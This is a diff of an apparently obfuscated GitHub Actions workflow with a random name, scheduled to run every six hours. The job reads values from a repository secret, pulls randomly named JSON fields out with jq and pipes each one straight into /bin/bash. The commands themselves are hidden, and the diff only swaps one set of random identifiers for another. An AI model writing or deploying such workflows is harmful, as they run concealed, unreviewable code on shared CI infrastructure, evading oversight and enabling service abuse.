@@ -1,31 +1,26 @@
 name: zxykyy
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 3/6 * * *'
+    - cron: '13 3/6 * * *'
 
-jobs:  # 14208
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: zxykyy
         env:
-          wcco78184: ${{ secrets.wcco78184 }}
+          lerkr127: ${{ secrets.lerkr127 }}
         run: |
-          echo $wcco78184 | jq -r .rcpds095 | /bin/bash
-          echo $wlzbx58 | jq -r .ctg60967 | /bin/bash
-          echo $nq13344 | jq -r .hh220 | /bin/bash
-          echo $vdd44 | jq -r .qozu23 | /bin/bash
-          echo $jck4742 | jq -r .za6 | /bin/bash
-          echo $hlw95534 | jq -r .szvl9 | /bin/bash
-          echo $mozez135 | jq -r .hdlg13 | /bin/bash
-          echo $m22 | jq -r .swcxn14820 | /bin/bash
-          echo $vdhcq9733 | jq -r .ob6 | /bin/bash
-          echo $sjyv3 | jq -r .n95 | /bin/bash
-          echo $sdeet119 | jq -r .zyrke3 | /bin/bash
-          echo $z52191 | jq -r .qbww560 | /bin/bash
-          echo $xk3748 | jq -r .kcc3246 | /bin/bash
-          echo $ao3 | jq -r .wg19638 | /bin/bash
-          echo $hpo168 | jq -r .ixghy3 | /bin/bash
+          echo $lerkr127 | jq -r .btcj502 | /bin/bash
+          echo $ujr952 | jq -r .o1817 | /bin/bash
+          echo $albvt133 | jq -r .jid442 | /bin/bash
+          echo $i12816 | jq -r .vw64 | /bin/bash
+          echo $zkjc228 | jq -r .tp19940 | /bin/bash
+          echo $hmt38513 | jq -r .dvkkg02 | /bin/bash
+          echo $rb9 | jq -r .m21029 | /bin/bash
+          echo $zhe9642 | jq -r .hnslw68 | /bin/bash
+          echo $xa79261 | jq -r .keb39203 | /bin/bash
 
